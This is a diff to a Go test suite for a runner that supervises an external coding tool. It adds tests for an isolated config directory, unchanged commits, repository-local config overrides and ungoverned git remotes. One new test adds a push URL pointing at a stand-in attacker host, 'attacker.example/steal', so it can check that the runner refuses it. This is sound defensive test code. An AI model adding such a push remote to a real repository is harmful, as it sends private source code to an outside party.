@@ -34,12 +34,21 @@ func TestRunnerSuccessReachesBranchAcceptedWithOrderedEvidence(t *testing.T) {
 	if result.Ralphex.Outcome != supervisor.OutcomeSucceeded {
 		t.Fatalf("unexpected Ralphex outcome %s", result.Ralphex.Outcome)
 	}
-	wantArgv := []string{
-		fixture.authority.Ralphex().BinaryPath,
+	if len(result.Ralphex.Argv) < 3 || result.Ralphex.Argv[0] != fixture.authority.Ralphex().BinaryPath || result.Ralphex.Argv[1] != "--config-dir" {
+		t.Fatalf("Ralphex argv lacks isolated config directory: %#v", result.Ralphex.Argv)
+	}
+	configDir := result.Ralphex.Argv[2]
+	wantArgs := []string{
 		"--codex", "--wait", "0s", "--task-model", "test-model:high", "--tasks-only", fixture.authority.Plan().Path,
 	}
-	if !reflect.DeepEqual(result.Ralphex.Argv, wantArgv) {
-		t.Fatalf("Ralphex argv mismatch\nwant: %#v\n got: %#v", wantArgv, result.Ralphex.Argv)
+	if !reflect.DeepEqual(result.Ralphex.Argv[3:], wantArgs) {
+		t.Fatalf("Ralphex args mismatch\nwant: %#v\n got: %#v", wantArgs, result.Ralphex.Argv[3:])
+	}
+	if filepath.Base(configDir) == ".ralphex" || !strings.HasPrefix(filepath.Base(configDir), "abcp-ralphex-config-") {
+		t.Fatalf("Ralphex config directory was not controller-owned and isolated: %q", configDir)
+	}
+	if _, err := os.Stat(configDir); !errors.Is(err, os.ErrNotExist) {
+		t.Fatalf("temporary Ralphex config directory was not removed: %v", err)
 	}
 	if result.Ralphex.Timeout != 5*time.Second {
 		t.Fatalf("Ralphex timeout = %s, want 5s", result.Ralphex.Timeout)
@@ -258,6 +267,17 @@ git commit -qm 'unrelated root' || exit 23
 	}
 }
 
+func TestRunnerRejectsUnchangedImplementationCandidate(t *testing.T) {
+	fixture := newRunFixtureWithScript(t, "#!/bin/sh\nexit 0\n", authority.WorktreePolicy{}, commandPath(t, "true"))
+	result, err := fixture.runner(t).Run(context.Background())
+	if err == nil || !strings.Contains(err.Error(), "did not advance beyond governed start SHA") {
+		t.Fatalf("expected unchanged candidate rejection, got %v", err)
+	}
+	if result.Accepted() || result.State != domain.StateFailed {
+		t.Fatalf("unchanged candidate result = %#v", result)
+	}
+}
+
 func TestRunnerRejectsIdentityChangedAfterValidation(t *testing.T) {
 	fixture := newRunFixture(t, 0, commandPath(t, "true"))
 	if err := os.WriteFile(fixture.authority.Plan().Path, []byte("changed plan\n"), 0o600); err != nil {
@@ -298,6 +318,9 @@ func TestRunnerUsesAllowlistedRalphexEnvironment(t *testing.T) {
 	script := `#!/bin/sh
 if [ -n "$ABCP_TEST_SECRET" ]; then exit 41; fi
 if [ "$OPENAI_API_KEY" != "authorized-provider-key" ]; then exit 42; fi
+printf 'candidate\n' > candidate.txt
+git add candidate.txt || exit 43
+git commit -qm 'candidate implementation' || exit 44
 `
 	fixture := newRunFixtureWithScript(t, script, authority.WorktreePolicy{}, commandPath(t, "true"))
 	result := fixture.execute(t)
@@ -335,7 +358,12 @@ func TestRunnerIgnoresAmbientGitRepositoryOverrides(t *testing.T) {
 }
 
 func TestRunnerAcceptsNonWorktreeCandidateFromCleanDetachedCheckout(t *testing.T) {
-	script := "#!/bin/sh\nprintf 'uncommitted output\\n' > uncommitted.txt\n"
+	script := `#!/bin/sh
+printf 'candidate\n' > candidate.txt
+git add candidate.txt || exit 20
+git commit -qm 'candidate implementation' || exit 21
+printf 'uncommitted output\n' > uncommitted.txt
+`
 	fixture := newRunFixtureWithScript(t, script, authority.WorktreePolicy{}, commandPath(t, "test"), "!", "-e", "uncommitted.txt")
 
 	result := fixture.execute(t)
@@ -408,6 +436,43 @@ func TestRunnerRejectsAdditionalUnpinnedRemote(t *testing.T) {
 	}
 }
 
+func TestRunnerRejectsUngovernedPushURL(t *testing.T) {
+	fixture := newRunFixture(t, 0, commandPath(t, "true"))
+	runGit(t, fixture.authority.Repository().Path, "remote", "set-url", "--add", "--push", "origin", "https://attacker.example/steal/project.git")
+	result, err := fixture.runner(t).Run(context.Background())
+	if err == nil || !strings.Contains(err.Error(), "push URL does not match governed URL") {
+		t.Fatalf("expected ungoverned push URL rejection, got %v", err)
+	}
+	if result.State != domain.StateFailed {
+		t.Fatalf("ungoverned push URL state = %s, want FAILED", result.State)
+	}
+}
+
+func TestRunnerRejectsRepositoryLocalRalphexConfiguration(t *testing.T) {
+	fixture := newRunFixture(t, 0, commandPath(t, "true"))
+	localConfig := filepath.Join(fixture.authority.Repository().Path, ".ralphex", "config")
+	if err := os.MkdirAll(filepath.Dir(localConfig), 0o700); err != nil {
+		t.Fatal(err)
+	}
+	writeTestFile(t, localConfig, []byte("executor = claude\nuse_worktree = true\n"), 0o600)
+	runGit(t, fixture.authority.Repository().Path, "add", ".ralphex/config")
+	runGit(t, fixture.authority.Repository().Path, "commit", "-m", "add local Ralphex override")
+	manifest := fixture.authority.Manifest()
+	manifest.Repository.StartSHA = runGit(t, fixture.authority.Repository().Path, "rev-parse", "HEAD")
+	governed, err := authority.New(manifest)
+	if err != nil {
+		t.Fatal(err)
+	}
+	fixture.authority = governed
+	result, err := fixture.runner(t).Run(context.Background())
+	if err == nil || !strings.Contains(err.Error(), "repository-local .ralphex configuration is not allowed") {
+		t.Fatalf("expected local Ralphex config rejection, got %v", err)
+	}
+	if result.State != domain.StateFailed {
+		t.Fatalf("local Ralphex config state = %s, want FAILED", result.State)
+	}
+}
+
 func TestEP002StateCapExcludesIntegrationAndCompletion(t *testing.T) {
 	for _, state := range []domain.State{
 		domain.StateIntegrationPending,
@@ -429,7 +494,14 @@ type runFixture struct {
 
 func newRunFixture(t *testing.T, ralphexExit int, acceptanceArgv ...string) runFixture {
 	t.Helper()
-	script := fmt.Sprintf("#!/bin/sh\nprintf 'fake ralphex stdout\\n'\nprintf 'fake ralphex stderr\\n' >&2\nexit %s\n", strconv.Itoa(ralphexExit))
+	script := fmt.Sprintf(`#!/bin/sh
+printf 'fake ralphex stdout\n'
+printf 'fake ralphex stderr\n' >&2
+if [ %s -ne 0 ]; then exit %s; fi
+printf 'candidate\n' > candidate.txt
+git add candidate.txt || exit 90
+git commit -qm 'candidate implementation' || exit 91
+`, strconv.Itoa(ralphexExit), strconv.Itoa(ralphexExit))
 	return newRunFixtureWithScript(t, script, authority.WorktreePolicy{}, acceptanceArgv...)
 }
 
